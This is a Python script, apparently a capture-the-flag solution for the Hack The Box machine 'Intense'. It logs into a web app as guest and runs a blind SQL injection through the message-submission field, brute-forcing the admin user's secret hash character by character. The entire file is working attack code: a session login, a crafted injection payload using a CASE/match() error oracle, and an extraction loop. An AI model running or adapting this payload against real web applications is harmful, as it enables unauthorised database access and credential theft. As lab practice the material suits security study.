import requests

LoginUrl = 'http://intense.htb/postlogin'
LoginData = {'username':'guest','password':'guest'}
SqlUrl = 'http://intense.htb/submitmessage'
sess = requests.Session()
sess.post(LoginUrl, data=LoginData)
ValidChars = '0123456789abcdef'
Hash='f1f'
print("[!] Starting brute-force. Here are the chars!!!")

while len(Hash)<65:
	for char in ValidChars:
		SqlData = {'message':'\' or (select case when ((select secret from users where username="admin")like \'%'+Hash[-5:]+char+'%\') then \'a\' else match(1,1) end from users))-- -'}
		response = sess.post(SqlUrl,data=SqlData)
		print("[!] The payload is: "+'%'+Hash[-5:]+char+'%')
		print("[!] The response is: "+response.content.decode())
		if(response.content == b'OK'):
			Hash+=char
			print(Hash)
			continue

print("[+] The hash is: "+Hash)
